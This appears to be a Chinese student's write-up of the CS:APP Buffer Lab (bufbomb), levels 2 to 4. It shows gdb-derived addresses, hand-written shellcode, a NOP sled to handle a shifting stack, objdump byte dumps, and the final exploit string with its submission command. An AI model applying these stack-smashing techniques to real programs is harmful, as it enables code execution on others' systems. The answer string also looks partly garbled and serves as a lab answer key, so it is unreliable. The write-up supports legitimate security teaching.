

level 2:

这个实验是首先要修改全局变量global_value的值为cookie，然后跳转到bang。
通过gdb发现，global_value的地址为0x804d100，cookie的地址为0x804d108。运行到getbuf时，%ebp的值为0x55683090，所以先将返回地址设置为%ebp-40的位置=0x55683068（字符串开始的位置，也就是命令的位置）。

lv2.s 为汇编文件，对其编译并用objdump反编译，得到其二进制格式，如下，
   0:   a1 08 d1 04 08          mov    0x804d108,%eax
   5:   a3 00 d1 04 08          mov    %eax,0x804d100
   a:   68 9d 8c 04 08          push   $0x8048c9d
   f:   c3                      ret    
命令：gcc -m32 -c lv2.s
      objdump -d lv2.o > lv2.code
* 汇编文件的命名后缀名为.s，否则gcc不会将其看作汇编文件，会出现link错误
* 汇编文件最后空一行


level 3:
目的：
原本执行饭getbuf返回值为1,这里的目的是控制代码执行，返回cookie的值。
策略：
使getbuf返回到自己的代码，执行那个自己的代码修改eax，然后返回test调用getbuf那一行。
test从getbuf返回的指令地址：0x8048dbe


level 4:
目的：
每次testn和getbufn的栈地址都不一样，一共调用5次getbufn，使得每次返回cookie的值。
思路：
调用getbufn时，修改%ebp+4处的返回地址，由于每次栈的位置不一样，需要利用nop滑动到有效代码。虽说每次栈位置不一样，但是在一定范围内，我的机器上%ebp值例如：
0x55683090
0x556830b0
0x55683020
0x55683070
由于其实位置在%ebp-0x208，也就是：
0x55683090-0x208
0x556830b0-0x208
0x55683020-0x208
0x55683070-0x208
为了防止非法访问，选择大一些的地址(比如0x55682ef8)，因为0x208位置很大，确保能滑到切不至于非法访问。滑动使用90，代表nop。
因为要设置getbufn的返回地址就会破坏保存在(%ebp)处的testn的%ebp值，我们可以通过gdb看到虽然每次在变，但是testn和getbufn的栈的位置总是相差0x30。当从getbuf返回时，%esp位于getbufn的%ebp+8的位置（%ebp+4为返回地址），所以testn的ebp为此时的%esp-8+0x30=%esp+0x28，下面是汇编代码：
lea 0x28(%esp), %ebp #修复ebp
mov 0x804d108, %eax  #修改返回值为cookie值
push $0x8048e3a      #返回testn的地址，也就是call<getbufn>下一条命令地址
ret
上面保存在lv4.s中，汇编并反汇编
gcc -m32 -c lv4.s
objdump -d lv4.o > lv4.code
lv4.code的反汇编结果如下：
   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	a1 08 d1 04 08       	mov    0x804d108,%eax
   9:	68 3a 8e 04 08       	push   $0x8048e3a
   e:	c3                   	ret    
答案如下：
d 6c 24 28 a1 08 d1 04 08 68 3a 8e 04 08 c3 00 00 00 00 f8 2e 68 55
最后提交答案
cat lv4.ans | ./hex2raw -n | ./bufbomb -n -u gaohan
